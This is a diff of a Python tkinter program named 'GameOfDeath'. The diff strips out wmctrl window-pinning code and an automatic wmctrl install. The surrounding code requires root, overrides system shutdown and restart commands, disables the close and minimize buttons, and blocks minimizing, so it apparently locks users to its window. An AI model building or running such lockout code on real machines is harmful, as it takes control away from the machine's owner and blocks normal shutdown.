@@ -5,7 +5,6 @@ import platform
 import signal
 import tkinter as tk
 from tkinter import messagebox
-import subprocess
 
 # Define the path to the lock file
 LOCK_FILE = "/tmp/game_of_death.lock"
@@ -45,10 +44,8 @@ class GameOfDeath:
         # Override the system shutdown and restart commands
         self.override_system_commands()
 
-        # Disable the close button
+        # Disable the close and minimize buttons
         self.root.protocol("WM_DELETE_WINDOW", self.disable_event)
-        
-        # Disable the minimize button
         self.disable_minimize()
 
         # Periodically check the window state to prevent minimizing
@@ -69,13 +66,6 @@ class GameOfDeath:
             style = ctypes.windll.user32.GetWindowLongW(hwnd, -16)
             style &= ~0x20000  # WS_MINIMIZEBOX
             ctypes.windll.user32.SetWindowLongW(hwnd, -16, style)
-        
-        # Unix-based systems specific code
-        elif platform.system() in ["Linux", "Darwin"]:
-            self.root.update_idletasks()  # Ensure the window has been created
-            window_id = self.root.winfo_id()
-            os.system(f"wmctrl -i -r {window_id} -b add,above")
-            os.system(f"wmctrl -i -r {window_id} -b add,sticky")
 
     def check_window_state(self):
         if self.root.state() == 'iconic':  # If the window is minimized
@@ -208,13 +198,6 @@ def main():
     if os.geteuid() != 0:
         print("This script must be run as root!")
         sys.exit(1)
-    
-    # Check if wmctrl is installed
-    try:
-        subprocess.run(["wmctrl", "-m"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    except subprocess.CalledProcessError:
-        print("wmctrl is not installed. Installing wmctrl...")
-        subprocess.run(["sudo", "apt-get", "install", "-y", "wmctrl"], check=True)
 
     root = tk.Tk()
     app = GameOfDeath(root)
